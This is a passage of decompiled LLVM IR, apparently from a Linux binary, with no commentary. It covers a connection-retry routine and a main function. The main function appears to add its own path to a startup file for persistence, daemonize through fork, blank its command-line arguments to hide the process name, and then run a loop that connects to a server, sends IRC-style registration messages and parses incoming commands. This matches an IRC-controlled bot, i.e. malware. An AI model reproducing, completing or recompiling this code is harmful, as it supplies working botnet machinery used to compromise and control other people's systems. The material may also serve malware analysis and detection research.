dec_label_pc_9e84:                                ; preds = %dec_label_pc_9e4c
  %v0_9e84 = call i32 @__GI___errno_location()
  %v1_9e8c = inttoptr i32 %v0_9e84 to i32*
  %v2_9e8c = load i32, i32* %v1_9e8c, align 4
  %v7_9e90 = icmp eq i32 %v2_9e8c, 106
  br i1 %v7_9e90, label %dec_label_pc_9e98, label %dec_label_pc_9f08

dec_label_pc_9e98:                                ; preds = %dec_label_pc_9e84, %dec_label_pc_9e4c
  %v2_9e9c = load i32, i32* @global_var_2784c.347, align 4
  %v5_9eb8 = call i32 @__GI_setsockopt(i32 %v2_9e9c, i32 1, i32 13, i32 0, i32 0)
  %v2_9ec0 = load i32, i32* @global_var_2784c.347, align 4
  %v5_9edc = call i32 @__GI_setsockopt(i32 %v2_9ec0, i32 1, i32 2, i32 0, i32 0)
  %v2_9ee4 = load i32, i32* @global_var_2784c.347, align 4
  %v5_9f00 = call i32 @__GI_setsockopt(i32 %v2_9ee4, i32 1, i32 9, i32 0, i32 0)
  store i32 %v3_9ca0, i32* @fp, align 4
  ret i32 %v5_9f00

dec_label_pc_9f08:                                ; preds = %dec_label_pc_9e84
  %v0_9f08 = call i32 @__GI___errno_location()
  %v1_9f10 = inttoptr i32 %v0_9f08 to i32*
  %v2_9f10 = load i32, i32* %v1_9f10, align 4
  %v7_9f14 = icmp eq i32 %v2_9f10, 115
  br i1 %v7_9f14, label %dec_label_pc_9f30, label %dec_label_pc_9f1c

dec_label_pc_9f1c:                                ; preds = %dec_label_pc_9f08
  %v0_9f1c = call i32 @__GI___errno_location()
  %v1_9f24 = inttoptr i32 %v0_9f1c to i32*
  %v2_9f24 = load i32, i32* %v1_9f24, align 4
  %v7_9f28 = icmp eq i32 %v2_9f24, 114
  br i1 %v7_9f28, label %dec_label_pc_9f30, label %dec_label_pc_9f58

dec_label_pc_9f30:                                ; preds = %dec_label_pc_9f1c, %dec_label_pc_9f08
  %v1_9f34 = call i32 @sleep(i32 1)
  br label %dec_label_pc_9f38

dec_label_pc_9f38:                                ; preds = %dec_label_pc_9e00, %dec_label_pc_9f30
  %v2_9f3c = call i32 @__GI_time(i32* null)
  %v2_9f4c = sub i32 %v2_9f3c, %v2_9e3c
  %tmp = icmp ult i32 %v2_9f4c, 10
  br i1 %tmp, label %dec_label_pc_9e4c, label %dec_label_pc_9f58

dec_label_pc_9f58:                                ; preds = %dec_label_pc_9f1c, %dec_label_pc_9f38
  store i32 0, i32* @global_var_27854.356, align 4
  %v2_9f68 = load i32, i32* @global_var_2784c.347, align 4
  %v1_9f70 = call i32 @__GI___libc_close(i32 %v2_9f68)
  br label %dec_label_pc_9cac.backedge

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32)* @sleep, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 ()* @__GI___errno_location, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_htons, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @inet_addr, { 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @rand, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_9f58, { 1, 0 }
  uselistorder label %dec_label_pc_9f38, { 1, 0 }
  uselistorder label %dec_label_pc_9e00, { 1, 0 }
  uselistorder label %dec_label_pc_9cac.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_9d04, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-2712 = alloca i32, align 4
  %stack_var_-6808 = alloca i32, align 4
  %stack_var_-408 = alloca i32, align 4
  %stack_var_-398 = alloca i32, align 4
  %stack_var_-1688 = alloca i32, align 4
  %stack_var_-664 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 40868, i32* %stack_var_-4, align 4
  %v2_9fa0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9fa0, i32* @fp, align 4
  %v2_9fb4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 ptrtoint ([19 x i8]* @global_var_1a41c.358 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1a30c.294 to i32), i32* @r1, align 4
  %v3_9ff4 = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_1a41c.358 to i32), i32 ptrtoint (i32* @global_var_1a30c.294 to i32))
  %v2_a004 = icmp eq i32 %v3_9ff4, 0
  br i1 %v2_a004, label %dec_label_pc_a00c, label %dec_label_pc_a028

dec_label_pc_a00c:                                ; preds = %entry
  store i32 ptrtoint ([13 x i8]* @global_var_1a430.361 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1a30c.294 to i32), i32* @r1, align 4
  %v3_a01c = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_1a430.361 to i32), i32 ptrtoint (i32* @global_var_1a30c.294 to i32))
  br label %dec_label_pc_a028

dec_label_pc_a028:                                ; preds = %entry, %dec_label_pc_a00c
  %stack_var_-80.0 = phi i32 [ %v3_a01c, %dec_label_pc_a00c ], [ %v3_9ff4, %entry ]
  %stack_var_-84.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1a430.361, i32 0, i32 0), %dec_label_pc_a00c ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_1a41c.358, i32 0, i32 0), %entry ]
  %v2_a02c = icmp eq i32 %stack_var_-80.0, 0
  br i1 %v2_a02c, label %dec_label_pc_a1bc, label %dec_label_pc_a034

dec_label_pc_a034:                                ; preds = %dec_label_pc_a028
  %v1_a044 = bitcast i8** %argv to i32*
  %v2_a044 = load i32, i32* %v1_a044, align 4
  %v1_a048 = inttoptr i32 %v2_a044 to i8*
  %v3_a04c = call i32 @strlen(i8* %v1_a048)
  %v2_a060 = ptrtoint i32* %stack_var_-348 to i32
  %v2_a06c = call i32 @getcwd(i32 %v2_a060, i32 256)
  store i32 ptrtoint (i32* @global_var_1a440.363 to i32), i32* @r1, align 4
  %v2_a07c = bitcast i32* %stack_var_-348 to i8*
  %v3_a07c = call i32 @__GI_strcoll(i8* %v2_a07c, i32 ptrtoint (i32* @global_var_1a440.363 to i32))
  %v2_a084 = icmp eq i32 %v3_a07c, 0
  br i1 %v2_a084, label %dec_label_pc_a1b4, label %dec_label_pc_a09c

dec_label_pc_a090:                                ; preds = %dec_label_pc_a09c
  %v1_a094 = add i32 %stack_var_-64.0, -1
  br label %dec_label_pc_a09c

dec_label_pc_a09c:                                ; preds = %dec_label_pc_a034, %dec_label_pc_a090
  %stack_var_-64.0 = phi i32 [ %v1_a094, %dec_label_pc_a090 ], [ %v3_a04c, %dec_label_pc_a034 ]
  %v2_a0ac = load i32, i32* %v1_a044, align 4
  %v2_a0b4 = add i32 %v2_a0ac, %stack_var_-64.0
  %v1_a0b8 = inttoptr i32 %v2_a0b4 to i8*
  %v2_a0b8 = load i8, i8* %v1_a0b8, align 1
  %v7_a0bc = icmp eq i8 %v2_a0b8, 47
  br i1 %v7_a0bc, label %dec_label_pc_a0c4, label %dec_label_pc_a090

dec_label_pc_a0c4:                                ; preds = %dec_label_pc_a09c
  %v2_a0d4 = load i32, i32* %v1_a044, align 4
  %v2_a0dc = add i32 %v2_a0d4, %stack_var_-64.0
  %v2_a0e0 = ptrtoint i32* %stack_var_-664 to i32
  store i32 %v2_a0e0, i32* @r0, align 4
  %v5_a0f4 = call i32 @sprintf(i32 %v2_a0e0, i32 ptrtoint ([8 x i8]* @global_var_1a444.365 to i32), i32 %v2_a060, i32 %v2_a0dc)
  %v1_a148 = inttoptr i32 %stack_var_-80.0 to i16*
  %v2_a100 = ptrtoint i32* %stack_var_-1688 to i32
  %v2_a128 = bitcast i32* %stack_var_-1688 to i8*
  br label %dec_label_pc_a144.outer

dec_label_pc_a0fc:                                ; preds = %dec_label_pc_a144
  %v3_a110 = call i32 @fgets(i32 %v2_a100, i32 1024, i32 %stack_var_-80.0)
  %v3_a128 = call i32 @__GI_strcasecmp(i8* %v2_a128, i32 %v2_a0e0)
  %v2_a130 = icmp eq i32 %v3_a128, 0
  br i1 %v2_a130, label %dec_label_pc_a138, label %dec_label_pc_a144

dec_label_pc_a138:                                ; preds = %dec_label_pc_a0fc
  %v1_a13c = add i32 %stack_var_-60.0.ph, 1
  br label %dec_label_pc_a144.outer

dec_label_pc_a144.outer:                          ; preds = %dec_label_pc_a138, %dec_label_pc_a0c4
  %stack_var_-60.0.ph = phi i32 [ %v1_a13c, %dec_label_pc_a138 ], [ 0, %dec_label_pc_a0c4 ]
  br label %dec_label_pc_a144

dec_label_pc_a144:                                ; preds = %dec_label_pc_a144.outer, %dec_label_pc_a0fc
  %v2_a148 = call i32 @feof(i16* %v1_a148)
  %v2_a150 = icmp eq i32 %v2_a148, 0
  br i1 %v2_a150, label %dec_label_pc_a0fc, label %dec_label_pc_a158

dec_label_pc_a158:                                ; preds = %dec_label_pc_a144
  %v2_a15c = icmp eq i32 %stack_var_-60.0.ph, 0
  %v2_a168 = call i32 @__GI_fclose(i16* %v1_a148)
  br i1 %v2_a15c, label %dec_label_pc_a164, label %dec_label_pc_a1bc

dec_label_pc_a164:                                ; preds = %dec_label_pc_a158
  %v4_a16c = ptrtoint i8* %stack_var_-84.0 to i32
  store i32 %v4_a16c, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1a44c.367 to i32), i32* @r1, align 4
  %v3_a174 = call i32 @__GI_fopen(i32 %v4_a16c, i32 ptrtoint (i32* @global_var_1a44c.367 to i32))
  %v2_a184 = icmp eq i32 %v3_a174, 0
  br i1 %v2_a184, label %dec_label_pc_a1bc, label %dec_label_pc_a18c

dec_label_pc_a18c:                                ; preds = %dec_label_pc_a164
  %v2_a198 = call i32 @__GI_fputs(i32 %v2_a0e0, i32 %v3_a174)
  %v1_a1a0 = inttoptr i32 %v3_a174 to i16*
  %v2_a1a0 = call i32 @__GI_fclose(i16* %v1_a1a0)
  br label %dec_label_pc_a1bc

dec_label_pc_a1b4:                                ; preds = %dec_label_pc_a034
  %v1_a1b8 = inttoptr i32 %stack_var_-80.0 to i16*
  %v2_a1b8 = call i32 @__GI_fclose(i16* %v1_a1b8)
  br label %dec_label_pc_a1bc

dec_label_pc_a1bc:                                ; preds = %dec_label_pc_a158, %dec_label_pc_a164, %dec_label_pc_a028, %dec_label_pc_a18c, %dec_label_pc_a1b4
  %v0_a1bc = call i32 @__libc_fork()
  %v2_a1c4 = icmp eq i32 %v0_a1bc, 0
  br i1 %v2_a1c4, label %dec_label_pc_a1d4, label %dec_label_pc_a1cc

dec_label_pc_a1cc:                                ; preds = %dec_label_pc_a1bc
  %v1_a1d0 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_a1d4

dec_label_pc_a1d4:                                ; preds = %dec_label_pc_a1bc, %dec_label_pc_a1cc
  %v1_a1e4 = bitcast i8** %argv to i32*
  %v2_a1e4 = load i32, i32* %v1_a1e4, align 4
  store i32 %v2_a1e4, i32* @r4, align 4
  %v2_a1f8 = load i32, i32* %v1_a1e4, align 4
  %v1_a1fc = inttoptr i32 %v2_a1f8 to i8*
  %v3_a200 = call i32 @strlen(i8* %v1_a1fc)
  %v0_a208 = load i32, i32* @r4, align 4
  store i32 ptrtoint ([14 x i8]* @global_var_1a450.369 to i32), i32* @r1, align 4
  %v4_a214 = call i32 @strncpy(i32 %v0_a208, i32 ptrtoint ([14 x i8]* @global_var_1a450.369 to i32), i32 %v3_a200)
  br label %dec_label_pc_a294

dec_label_pc_a224:                                ; preds = %dec_label_pc_a294
  %v3_a228 = mul i32 %storemerge15, 4
  %v2_a240 = add i32 %v3_a228, %tmp
  %v1_a244 = inttoptr i32 %v2_a240 to i32*
  %v2_a244 = load i32, i32* %v1_a244, align 4
  store i32 %v2_a244, i32* @r4, align 4
  %v2_a268 = load i32, i32* %v1_a244, align 4
  %v1_a26c = inttoptr i32 %v2_a268 to i8*
  %v3_a270 = call i32 @strlen(i8* %v1_a26c)
  %v0_a278 = load i32, i32* @r4, align 4
  %v3_a284 = inttoptr i32 %v0_a278 to i8*
  %v4_a284 = call i32 @__GI_memset(i8* %v3_a284, i32 0, i32 %v3_a270)
  %v1_a28c = add nuw i32 %storemerge15, 1
  br label %dec_label_pc_a294

dec_label_pc_a294:                                ; preds = %dec_label_pc_a1d4, %dec_label_pc_a224
  %storemerge15 = phi i32 [ 1, %dec_label_pc_a1d4 ], [ %v1_a28c, %dec_label_pc_a224 ]
  %v5_a2ac = icmp slt i32 %storemerge15, %argc
  br i1 %v5_a2ac, label %dec_label_pc_a224, label %dec_label_pc_a2b0

dec_label_pc_a2b0:                                ; preds = %dec_label_pc_a294
  %v2_a2b4 = call i32 @__GI_time(i32* null)
  %v0_a2bc = call i32 @__getpid()
  store i32 %v0_a2bc, i32* @r0, align 4
  %v2_a2c4 = xor i32 %v2_a2b4, %v0_a2bc
  store i32 %v2_a2c4, i32* @r4, align 4
  %v0_a2c8 = call i32 @getppid()
  %v0_a2d0 = load i32, i32* @r4, align 4
  %v2_a2d0 = add i32 %v0_a2d0, %v0_a2c8
  %v1_a2d8 = call i32 @srand(i32 %v2_a2d0)
  %v1_a2e4 = call i32 @makestring(i32 %v1_a2d8)
  %v2_a2f4 = ptrtoint i32* %stack_var_-398 to i32
  store i32 ptrtoint ([16 x i8]* @global_var_1a3ec.345 to i32), i32* @r1, align 4
  %v3_a300 = bitcast i32* %stack_var_-398 to i8*
  %v4_a300 = call i32 @strcpy(i8* %v3_a300, i32 ptrtoint ([16 x i8]* @global_var_1a3ec.345 to i32))
  store i32 %v1_a2e4, i32* @r1, align 4
  %v3_a314 = call i32 @strcat(i8* %v3_a300, i32 %v1_a2e4)
  store i32 %v2_a2f4, i32* @global_var_27848.318, align 4
  %v1_a328 = call i32 @makestring(i32 %v3_a314)
  store i32 %v1_a328, i32* @global_var_27840.298, align 4
  %v1_a338 = call i32 @makestring(i32 %v1_a328)
  store i32 %v1_a338, i32* @global_var_27850.374, align 4
  store i32 ptrtoint (i32* @global_var_1a460.377 to i32), i32* @global_var_27860.305, align 4
  store i32 ptrtoint (i32* @global_var_1a464.380 to i32), i32* @global_var_2785c.328, align 4
  store i32 ptrtoint (i32* @global_var_1a464.380 to i32), i32* @global_var_27844.382, align 4
  store i32 0, i32* @global_var_27854.356, align 4
  %v2_a3d4 = ptrtoint i32* %stack_var_-664 to i32
  %v2_a494 = ptrtoint i32* %stack_var_-408 to i32
  %v2_a6a8 = ptrtoint i32* %stack_var_-6808 to i32
  %v2_a6e4 = add i32 %v2_9fb4, -6784
  %v2_a79c = ptrtoint i32* %stack_var_-2712 to i32
  %v2_a7a8 = bitcast i32* %stack_var_-2712 to i8*
  %v2_a850 = ptrtoint i32* %stack_var_-1688 to i32
  %v3_a85c = bitcast i32* %stack_var_-1688 to i8*
  br label %dec_label_pc_a378

dec_label_pc_a378:                                ; preds = %dec_label_pc_a69c, %dec_label_pc_a410, %dec_label_pc_a918, %dec_label_pc_a2b0
  %v0_a378 = call i32 @con()
  %v2_a380 = load i32, i32* @global_var_2784c.347, align 4
  %v2_a388 = load i32, i32* @global_var_27844.382, align 4
  %v4_a398 = call i32 @Send(i32 %v2_a380, i32 ptrtoint ([9 x i8]* @global_var_1a468.386 to i32), i32 %v2_a388)
  %v2_a3a0 = load i32, i32* @global_var_2784c.347, align 4
  %v2_a3a8 = load i32, i32* @global_var_27848.318, align 4
  %v2_a3b0 = load i32, i32* @global_var_27840.298, align 4
  store i32 %v2_a3b0, i32* @lr, align 4
  %v4_a3d0 = call i32 @Send(i32 %v2_a3a0, i32 ptrtoint ([41 x i8]* @global_var_1a474.388 to i32), i32 %v2_a3a8)
  br label %dec_label_pc_a3e8.lr.ph

dec_label_pc_a3e8.lr.ph:                          ; preds = %dec_label_pc_a654, %dec_label_pc_a6d4, %dec_label_pc_a938, %dec_label_pc_a958, %dec_label_pc_a378
  br label %dec_label_pc_a3e8

dec_label_pc_a3e8:                                ; preds = %dec_label_pc_a3e8.lr.ph, %dec_label_pc_a3e8
  %storemerge1630 = phi i32 [ 0, %dec_label_pc_a3e8.lr.ph ], [ %v1_a3fc, %dec_label_pc_a3e8 ]
  %v5_a3f4 = mul nuw nsw i32 %storemerge1630, 4
  %v6_a3f4 = add i32 %v5_a3f4, %v2_a3d4
  %v7_a3f4 = inttoptr i32 %v6_a3f4 to i32*
  store i32 0, i32* %v7_a3f4, align 4
  %v1_a3fc = add nuw nsw i32 %storemerge1630, 1
  %tmp78 = icmp ult i32 %v1_a3fc, 32
  br i1 %tmp78, label %dec_label_pc_a3e8, label %dec_label_pc_a410

dec_label_pc_a410:                                ; preds = %dec_label_pc_a3e8
  %v2_a414 = load i32, i32* @global_var_2784c.347, align 4
  %v3_a418 = udiv i32 %v2_a414, 32
  %v3_a42c = mul nuw nsw i32 %v3_a418, 4
  %v2_a434 = add i32 %v3_a42c, %v2_9fb4
  %v2_a438 = add i32 %v2_a434, -640
  %v1_a43c = inttoptr i32 %v2_a438 to i32*
  %v2_a43c = load i32, i32* %v1_a43c, align 4
  %v1_a448 = urem i32 %v2_a414, 32
  %v6_a450 = shl i32 1, %v1_a448
  %v2_a454 = or i32 %v2_a43c, %v6_a450
  store i32 %v2_a454, i32* %v1_a43c, align 4
  store i32 1200, i32* %stack_var_-408, align 4
  %v2_a488 = load i32, i32* @global_var_2784c.347, align 4
  %v1_a48c = add i32 %v2_a488, 1
  %v5_a4a8 = call i32 @__libc_select(i32 %v1_a48c, i32 %v2_a3d4, i32 0, i32 0, i32 %v2_a494)
  %tmp79 = icmp slt i32 %v5_a4a8, 1
  br i1 %tmp79, label %dec_label_pc_a378, label %dec_label_pc_a640.preheader

dec_label_pc_a640.preheader:                      ; preds = %dec_label_pc_a410
  %v2_a644109 = load i32, i32* @global_var_24748.287, align 4
  %v3_a64c111 = icmp eq i32 %v2_a644109, 0
  br i1 %v3_a64c111, label %dec_label_pc_a654, label %dec_label_pc_a4c4

dec_label_pc_a4c4:                                ; preds = %dec_label_pc_a634, %dec_label_pc_a640.preheader
  %storemerge17118 = phi i32 [ %.pre136, %dec_label_pc_a634 ], [ 0, %dec_label_pc_a640.preheader ]
  %v3_a4c8 = mul i32 %storemerge17118, 4
  %v2_a4d4 = load i32, i32* @global_var_27864.289, align 4
  %v2_a4d8 = add i32 %v2_a4d4, %v3_a4c8
  %v1_a4dc = inttoptr i32 %v2_a4d8 to i32*
  %v2_a4dc = load i32, i32* %v1_a4dc, align 4
  %v3_a4ec = call i32 @__libc_waitpid(i32 %v2_a4dc, i32 0, i32 1)
  %tmp80 = icmp slt i32 %v3_a4ec, 1
  %.pre136 = add i32 %storemerge17118, 1
  br i1 %tmp80, label %dec_label_pc_a634, label %dec_label_pc_a550.preheader

dec_label_pc_a550.preheader:                      ; preds = %dec_label_pc_a4c4
  %v2_a55488 = load i32, i32* @global_var_24748.287, align 4
  %v3_a55c90 = icmp ult i32 %.pre136, %v2_a55488
  %v2_a56891 = load i32, i32* @global_var_27864.289, align 4
  %v1_a56c92 = add i32 %v2_a56891, -4
  %v3_a57493 = mul i32 %.pre136, 4
  %v2_a57894 = add i32 %v1_a56c92, %v3_a57493
  br i1 %v3_a55c90, label %dec_label_pc_a50c, label %dec_label_pc_a564

dec_label_pc_a50c:                                ; preds = %dec_label_pc_a550.preheader, %dec_label_pc_a50c
  %v2_a57898 = phi i32 [ %v2_a578, %dec_label_pc_a50c ], [ %v2_a57894, %dec_label_pc_a550.preheader ]
  %v3_a57497 = phi i32 [ %v3_a574, %dec_label_pc_a50c ], [ %v3_a57493, %dec_label_pc_a550.preheader ]
  %v2_a56896 = phi i32 [ %v2_a568, %dec_label_pc_a50c ], [ %v2_a56891, %dec_label_pc_a550.preheader ]
  %v1_a50095 = phi i32 [ %v1_a500, %dec_label_pc_a50c ], [ %.pre136, %dec_label_pc_a550.preheader ]
  %v2_a538 = add i32 %v2_a56896, %v3_a57497
  %v1_a53c = inttoptr i32 %v2_a538 to i32*
  %v2_a53c = load i32, i32* %v1_a53c, align 4
  %v2_a540 = inttoptr i32 %v2_a57898 to i32*
  store i32 %v2_a53c, i32* %v2_a540, align 4
  %v1_a500 = add i32 %v1_a50095, 1
  %v2_a554 = load i32, i32* @global_var_24748.287, align 4
  %v3_a55c = icmp ult i32 %v1_a500, %v2_a554
  %v2_a568 = load i32, i32* @global_var_27864.289, align 4
  %v1_a56c = add i32 %v2_a568, -4
  %v3_a574 = mul i32 %v1_a500, 4
  %v2_a578 = add i32 %v1_a56c, %v3_a574
  br i1 %v3_a55c, label %dec_label_pc_a50c, label %dec_label_pc_a550.dec_label_pc_a564_crit_edge

dec_label_pc_a550.dec_label_pc_a564_crit_edge:    ; preds = %dec_label_pc_a50c
  br label %dec_label_pc_a564

dec_label_pc_a564:                                ; preds = %dec_label_pc_a550.dec_label_pc_a564_crit_edge, %dec_label_pc_a550.preheader
  %v2_a578.lcssa = phi i32 [ %v2_a578, %dec_label_pc_a550.dec_label_pc_a564_crit_edge ], [ %v2_a57894, %dec_label_pc_a550.preheader ]
  %v2_a580 = inttoptr i32 %v2_a578.lcssa to i32*
  store i32 0, i32* %v2_a580, align 4
  %v2_a588 = load i32, i32* @global_var_24748.287, align 4
  %v1_a58c = add i32 %v2_a588, -1
  store i32 %v1_a58c, i32* @global_var_24748.287, align 4
  %v3_a5a4 = mul i32 %v2_a588, 4
  %v1_a5ac = call i32 @malloc(i32 %v3_a5a4)
  %v2_a608102 = load i32, i32* @global_var_24748.287, align 4
  %v3_a610104 = icmp eq i32 %v2_a608102, 0
  br i1 %v3_a610104, label %dec_label_pc_a618, label %dec_label_pc_a5c4

dec_label_pc_a5c4:                                ; preds = %dec_label_pc_a564, %dec_label_pc_a5c4
  %storemerge19105 = phi i32 [ %v1_a5fc, %dec_label_pc_a5c4 ], [ 0, %dec_label_pc_a564 ]
  %v3_a5c8 = mul i32 %storemerge19105, 4
  %v2_a5d4 = add i32 %v3_a5c8, %v1_a5ac
  %v2_a5e8 = load i32, i32* @global_var_27864.289, align 4
  %v2_a5ec = add i32 %v2_a5e8, %v3_a5c8
  %v1_a5f0 = inttoptr i32 %v2_a5ec to i32*
  %v2_a5f0 = load i32, i32* %v1_a5f0, align 4
  %v2_a5f4 = inttoptr i32 %v2_a5d4 to i32*
  store i32 %v2_a5f0, i32* %v2_a5f4, align 4
  %v1_a5fc = add i32 %storemerge19105, 1
  %v2_a608 = load i32, i32* @global_var_24748.287, align 4
  %v3_a610 = icmp ult i32 %v1_a5fc, %v2_a608
  br i1 %v3_a610, label %dec_label_pc_a5c4, label %dec_label_pc_a604.dec_label_pc_a618_crit_edge

dec_label_pc_a604.dec_label_pc_a618_crit_edge:    ; preds = %dec_label_pc_a5c4
  br label %dec_label_pc_a618

dec_label_pc_a618:                                ; preds = %dec_label_pc_a564, %dec_label_pc_a604.dec_label_pc_a618_crit_edge
  %v2_a61c = load i32, i32* @global_var_27864.289, align 4
  store i32 %v2_a61c, i32* @r0, align 4
  %v0_a624 = call i32 @free()
  store i32 %v1_a5ac, i32* @global_var_27864.289, align 4
  br label %dec_label_pc_a634

dec_label_pc_a634:                                ; preds = %dec_label_pc_a4c4, %dec_label_pc_a618
  %v2_a644 = load i32, i32* @global_var_24748.287, align 4
  %v3_a64c = icmp ult i32 %.pre136, %v2_a644
  br i1 %v3_a64c, label %dec_label_pc_a4c4, label %dec_label_pc_a654

dec_label_pc_a654:                                ; preds = %dec_label_pc_a634, %dec_label_pc_a640.preheader
  %v2_a658 = load i32, i32* @global_var_2784c.347, align 4
  %v3_a65c = udiv i32 %v2_a658, 32
  %v3_a668 = mul nuw nsw i32 %v3_a65c, 4
  %v2_a670 = add i32 %v3_a668, %v2_9fb4
  %v2_a674 = add i32 %v2_a670, -640
  %v1_a678 = inttoptr i32 %v2_a674 to i32*
  %v2_a678 = load i32, i32* %v1_a678, align 4
  %v1_a684 = urem i32 %v2_a658, 32
  %v6_a6885 = lshr i32 %v2_a678, %v1_a684
  %v1_a690 = urem i32 %v6_a6885, 2
  %v2_a694 = icmp eq i32 %v1_a690, 0
  br i1 %v2_a694, label %dec_label_pc_a3e8.lr.ph, label %dec_label_pc_a69c

dec_label_pc_a69c:                                ; preds = %dec_label_pc_a654
  %v4_a6bc = call i32 @__libc_recv(i32 %v2_a658, i32 %v2_a6a8, i32 4096, i32 0)
  %tmp81 = icmp slt i32 %v4_a6bc, 1
  br i1 %tmp81, label %dec_label_pc_a378, label %dec_label_pc_a6d4

dec_label_pc_a6d4:                                ; preds = %dec_label_pc_a69c
  %v2_a6e8 = add i32 %v2_a6e4, %v4_a6bc
  %v3_a6e8 = inttoptr i32 %v2_a6e8 to i8*
  store i8 0, i8* %v3_a6e8, align 1
  %v6_a704 = call i32 @__GI_strtok(i32 %v2_a6a8, i32 ptrtoint (i32* @global_var_1a4a0.392 to i32), i32 %v2_a6e8, i32 %v2_a6a8, i32 %v4_a6bc)
  %v2_a95033 = icmp eq i32 %v6_a704, 0
  br i1 %v2_a95033, label %dec_label_pc_a3e8.lr.ph, label %dec_label_pc_a958

dec_label_pc_a714:                                ; preds = %dec_label_pc_a958
  %v3_a718 = call i32 @filter(i8* nonnull %storemerge35)
  %v2_a720 = load i8, i8* %storemerge35, align 1
  %v7_a724 = icmp eq i8 %v2_a720, 58
  br i1 %v7_a724, label %dec_label_pc_a744, label %dec_label_pc_a7d0

dec_label_pc_a738:                                ; preds = %dec_label_pc_a75c
  %v1_a73c = add i32 %storemerge24, 1
  br label %dec_label_pc_a744

dec_label_pc_a744:                                ; preds = %dec_label_pc_a714, %dec_label_pc_a738
  %storemerge24 = phi i32 [ %v1_a73c, %dec_label_pc_a738 ], [ 0, %dec_label_pc_a714 ]
  %v3_a74c = call i32 @strlen(i8* %storemerge35)
  %v3_a754 = icmp ult i32 %storemerge24, %v3_a74c
  br i1 %v3_a754, label %dec_label_pc_a75c, label %dec_label_pc_a744.dec_label_pc_a778_crit_edge

dec_label_pc_a744.dec_label_pc_a778_crit_edge:    ; preds = %dec_label_pc_a744
  %.pre = add i32 %storemerge24, %storemerge35.in
  %.pre36 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_a778

dec_label_pc_a75c:                                ; preds = %dec_label_pc_a744
  %v2_a768 = add i32 %storemerge24, %storemerge35.in
  %v1_a76c = inttoptr i32 %v2_a768 to i8*
  %v2_a76c = load i8, i8* %v1_a76c, align 1
  %v7_a770 = icmp eq i8 %v2_a76c, 32
  br i1 %v7_a770, label %dec_label_pc_a778, label %dec_label_pc_a738

dec_label_pc_a778:                                ; preds = %dec_label_pc_a75c, %dec_label_pc_a744.dec_label_pc_a778_crit_edge
  %v3_a78c.pre-phi = phi i8* [ %.pre36, %dec_label_pc_a744.dec_label_pc_a778_crit_edge ], [ %v1_a76c, %dec_label_pc_a75c ]
  %v2_a784.pre-phi = phi i32 [ %.pre, %dec_label_pc_a744.dec_label_pc_a778_crit_edge ], [ %v2_a768, %dec_label_pc_a75c ]
  store i8 0, i8* %v3_a78c.pre-phi, align 1
  %v1_a794 = add i32 %storemerge35.in, 1
  store i32 %v1_a794, i32* @r1, align 4
  %v3_a7a8 = call i32 @strcpy(i8* %v2_a7a8, i32 %v1_a794)
  %v1_a7bc = add i32 %v2_a784.pre-phi, 1
  store i32 %v1_a7bc, i32* @r1, align 4
  %v4_a7c8 = call i32 @strcpy(i8* %storemerge35, i32 %v1_a7bc)
  br label %dec_label_pc_a7e8

dec_label_pc_a7d0:                                ; preds = %dec_label_pc_a714
  store i32 %v2_a79c, i32* @r3, align 4
  store i32 %v2_a79c, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1a4a4.394 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  %v0_a7e4 = call i32 @memcpy()
  br label %dec_label_pc_a7e8

dec_label_pc_a7e8:                                ; preds = %dec_label_pc_a778, %dec_label_pc_a7d0
  br label %dec_label_pc_a800

dec_label_pc_a7f4:                                ; preds = %dec_label_pc_a818
  %v1_a7f8 = add i32 %storemerge21, 1
  br label %dec_label_pc_a800

dec_label_pc_a800:                                ; preds = %dec_label_pc_a7e8, %dec_label_pc_a7f4
  %storemerge21 = phi i32 [ 0, %dec_label_pc_a7e8 ], [ %v1_a7f8, %dec_label_pc_a7f4 ]
  store i32 %storemerge21, i32* @r4, align 4
  %v3_a808 = call i32 @strlen(i8* %storemerge35)
  %v0_a810 = load i32, i32* @r4, align 4
  %v3_a810 = icmp ult i32 %v0_a810, %v3_a808
  br i1 %v3_a810, label %dec_label_pc_a818, label %dec_label_pc_a800.dec_label_pc_a834_crit_edge

dec_label_pc_a800.dec_label_pc_a834_crit_edge:    ; preds = %dec_label_pc_a800
  %.pre37 = add i32 %storemerge21, %storemerge35.in
  %.pre38 = inttoptr i32 %.pre37 to i8*
  br label %dec_label_pc_a834

dec_label_pc_a818:                                ; preds = %dec_label_pc_a800
  %v2_a824 = add i32 %storemerge21, %storemerge35.in
  %v1_a828 = inttoptr i32 %v2_a824 to i8*
  %v2_a828 = load i8, i8* %v1_a828, align 1
  %v7_a82c = icmp eq i8 %v2_a828, 32
  br i1 %v7_a82c, label %dec_label_pc_a834, label %dec_label_pc_a7f4

dec_label_pc_a834:                                ; preds = %dec_label_pc_a818, %dec_label_pc_a800.dec_label_pc_a834_crit_edge
